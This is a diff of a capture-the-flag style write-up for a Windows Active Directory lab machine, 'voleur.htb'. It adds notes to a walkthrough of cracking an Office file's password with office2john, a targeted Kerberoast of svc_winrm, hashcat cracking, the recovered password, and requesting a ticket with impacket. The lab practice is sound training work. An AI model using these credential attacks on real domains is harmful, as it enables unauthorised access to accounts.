@@ -3,7 +3,7 @@
 | ---------------- | ------------------------ |
 | **OS**           | Windows                  |
 | **Difficulty**   | Medium                   |
-| **Release Date** | YYYY-MM-DD               |
+| **Release Date** | 5th July, 2025           |
 | **State**        | YYYY-MM-DD               |
 | **IP**           | 10.10.10.X               |
 | **Techniques**   | technique-1, technique-2 |
@@ -70,6 +70,7 @@ Nmap done: 1 IP address (1 host up) scanned in 55.22 seconds
 
 ```
 
+Standard AD set
 ### Service Enumeration
 
 ```
@@ -206,8 +207,11 @@ getting file \First-Line Support\Access_Review.xlsx of size 16896 as Access_Revi
 smb: \First-Line Support\> 
 
 ```
+The file is downloaded.
 
 using office2john 
+
+![](./screens/1.png)
 
 ```
 $office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
@@ -228,7 +232,11 @@ Session completed.
 
 ```
 
+![](./screens/2.png)
+
 decrypted file:
+
+![](./screens/3.png)
 
 | User             | Job Title                      | Permissions              | Notes                                                                 |
 | ---------------- | ------------------------------ | ------------------------ | --------------------------------------------------------------------- |
@@ -274,7 +282,9 @@ INFO: Compressing output into 20261006005501_bloodhound.zip
 ```
 ## Foothold
 
+![](./screens/4.png)
 
+svc_ldap can write the SPN of svc_winrm and he is in the restore users group (useful for restoring todd wolfe object later on)
 ### Exploitation
 
 ## Targeted kerberoast:
@@ -293,6 +303,8 @@ $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e7344a8ffda7789a7829faee
 [VERBOSE] SPN removed successfully for (svc_winrm)
 
 ```
+
+the svc_winrm hash cracks.
 
 ```
  hashcat -m 13100 svc_winrm.hash /usr/share/wordlists/rockyou.txt
@@ -359,6 +371,8 @@ Stopped: Mon Oct  5 17:42:26 2026
 ```
 
 svc_winrm:AFireInsidedeOzarctica980219afi
+
+Getting a ticket:
 
 ```
 impacket-getTGT -dc-ip 10.129.232.130 voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
